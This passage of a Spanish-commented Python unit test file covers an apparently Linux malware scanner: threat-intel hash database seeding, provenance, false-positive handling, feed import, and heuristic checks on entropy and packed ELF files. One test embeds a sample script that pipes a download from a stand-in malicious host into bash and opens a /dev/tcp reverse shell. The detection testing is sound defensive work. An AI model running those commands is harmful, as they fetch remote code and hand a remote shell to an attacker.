        test_db = os.path.join(self.tmp, "test_intel_exact.db")
        ti = ThreatIntelligence(db_path=test_db)
        # Base vacía antes de semillas
        self.assertEqual(ti.count_hashes(), 0)
        self.assertEqual(ti.count_urls(), 0)
        self.assertNotEqual(ti.count_hashes(), 5248)
        self.assertNotEqual(ti.count_urls(), 1420)

        # Cargar semillas auténticas
        ti.load_seed_data()
        self.assertEqual(ti.count_hashes(), 10)
        self.assertEqual(ti.count_urls(), 7)

    def test_threat_intel_provenance_and_confidence(self):
        """Verifica que los indicadores almacenen fuente, confianza, tags y fecha real."""
        test_db = os.path.join(self.tmp, "test_intel_prov.db")
        ti = ThreatIntelligence(db_path=test_db)
        valid_hash = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
        ti.add_hash(valid_hash, "Trojan.Linux.Test", source="MalwareBazaar", confidence=95, tags="test,linux")

        res = ti.lookup_hash(valid_hash)
        self.assertIsNotNone(res)
        self.assertEqual(res["source"], "MalwareBazaar")
        self.assertEqual(res["confidence"], 95)
        self.assertEqual(res["tags"], "test,linux")
        self.assertGreater(res["first_seen"], 0)

        # Rechazo de hash malformado
        invalid_hash = "not-a-valid-sha256"
        self.assertFalse(ti.add_hash(invalid_hash, "Bad"))
        self.assertIsNone(ti.lookup_hash(invalid_hash))

    def test_threat_intel_false_positive_management(self):
        """Verifica que marcar un falso positivo desactive el indicador sin borrar auditoría."""
        test_db = os.path.join(self.tmp, "test_intel_fp.db")
        ti = ThreatIntelligence(db_path=test_db)
        h = "1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff"
        ti.add_hash(h, "FalseThreat")
        self.assertEqual(ti.count_hashes(), 1)
        self.assertIsNotNone(ti.lookup_hash(h))

        # Marcar falso positivo
        marked = ti.mark_false_positive(h, reason="Valid Enterprise Tool")
        self.assertTrue(marked)
        # Ya no debe dar positivo en consultas activas
        self.assertIsNone(ti.lookup_hash(h))
        self.assertEqual(ti.count_hashes(), 0)


    def test_heuristic_multicapa_shannon_entropy(self):
        """Verifica el cálculo de entropía de Shannon sobre datos uniformes vs aleatorios."""
        eng = MultiLayerHeuristicEngine()
        zero_data = b"\x00" * 1000
        self.assertEqual(eng.calculate_entropy(zero_data), 0.0)

        random_data = bytes([i % 256 for i in range(10000)])
        entropy = eng.calculate_entropy(random_data)
        self.assertGreater(entropy, 7.5)

    def test_heuristic_multicapa_elf_packed_and_symbols(self):
        """Verifica detección estructural de empaquetadores UPX y símbolos de inyección/rootkits."""
        eng = MultiLayerHeuristicEngine(score_threshold=45)
        # Binario ELF sintético con UPX y símbolo sys_call_table
        fake_elf = b"ELF" + (b"\x00" * 40) + b"UPX!" + b"\x00\x00sys_call_table"
        res = eng.analyze_buffer(fake_elf)
        self.assertTrue(res.is_malicious)
        self.assertTrue(res.is_packed)
        self.assertIn("sys_call_table", " ".join(res.reasons))
        self.assertGreaterEqual(res.risk_score, 45)

    def test_heuristic_multicapa_script_obfuscation(self):
        """Verifica detección de técnicas de ofuscación y ejecución en memoria (pipe to bash)."""
        eng = MultiLayerHeuristicEngine(score_threshold=45)
        # Script que descarga y ejecuta en memoria junto con shell interactiva
        suspicious_script = (b"#!/bin/bash\n" + b"curl -sSL http://malicious.org/payload.sh | bash\n" + b"bash -i >& /dev/tcp/1.1.1.1/80 0>&1\n")
        res = eng.analyze_buffer(suspicious_script)
        self.assertTrue(res.is_malicious)
        self.assertGreaterEqual(res.risk_score, 50)
        self.assertEqual(res.threat_category, "Heuristic.Linux.ReverseShell")

    def test_threat_intel_feed_import_and_integrity(self):
        """Verifica el procesamiento de feeds CSV/JSON y el registro de sumas de verificación."""
        test_db = os.path.join(self.tmp, "test_intel_feed.db")
        ti = ThreatIntelligence(db_path=test_db)

        raw_csv = (b"# first_seen,sha256_hash,md5,sha1,reporter,fname,ftype,mime,signature\n" + b"2026-11-04,2222222222222222222222222222222222222222222222222222222222222222,,,,user,test.bin,elf,,Linux.Threat\n")
        added, updated, f_sha = ti.import_feed_data("MalwareBazaar", raw_csv, feed_url="https://bazaar.abuse.ch")
        self.assertEqual(added, 1)
        self.assertTrue(len(f_sha) == 64)
        self.assertEqual(ti.count_hashes(), 1)

        history = ti.get_feed_sync_history()
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["feed_name"], "MalwareBazaar")
        self.assertEqual(history[0]["status"], "SUCCESS")


if __name__ == "__main__":
    unittest.main()
